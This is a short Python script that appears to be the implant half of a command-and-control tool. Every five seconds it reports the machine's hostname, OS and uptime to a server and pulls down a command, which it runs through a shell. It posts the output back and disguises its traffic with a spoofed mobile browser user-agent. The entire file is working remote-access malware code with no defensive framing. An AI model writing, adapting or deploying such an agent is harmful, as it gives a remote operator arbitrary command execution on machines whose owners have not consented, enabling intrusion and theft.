import time
import uuid
import requests
import platform
import psutil
import os
import subprocess

SERVER_URL = "http://127.0.0.1:5000"
AGENT_ID = str(uuid.uuid4())
USER_AGENT = "Mozilla/5.0 (Linux; Android 8.1.0; Core-X3 Build/OPM1.171019.019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36"

headers = {
        "Content-Type": 'application/json',
        "User-Agent": USER_AGENT,
        "Authorization": f"Bearer {AGENT_ID}",
        "X-Session-ID": f"{AGENT_ID}"
}

def get_uptime():
    boot_time = psutil.boot_time()
    uptime_seconds = time.time() - boot_time
    uptime_minutes = uptime_seconds / 60

    return f"{uptime_minutes:.2f}"

def get_task():
    try:
        resp = requests.get(SERVER_URL + "/task/"+AGENT_ID, headers=headers)

        if resp.status_code == 200:
            data = resp.json()["task"]["command"]
            send_msg(execute(data))
    except:
        print("lost connection")

def execute(comm):
    try:
        result = subprocess.check_output(comm, shell=True, stderr=subprocess.STDOUT).decode("utf-8")
        return result
    except:
        pass

def send_msg(result):
    try:
        resp=requests.post(SERVER_URL + "/get_result/"+AGENT_ID, json={"result":result}, headers=headers)
        if resp.status_code == 200:
            print(f"send success {result}")
    except:
        pass

def status(): 
    payload = {"agent_id": AGENT_ID, "hostname":platform.node(),"uptime":get_uptime(), "os":platform.system() }

    try:
        resp = requests.post(SERVER_URL + "/status", json=payload, headers=headers)
        
        if resp.status_code == 200:
            data = resp.json()
            print(data)
    except Exception as err:
        print(err)


def main():
    while 1:
        status()
        get_task()
        time.sleep(5)

if "__main__" == __name__:
    main()
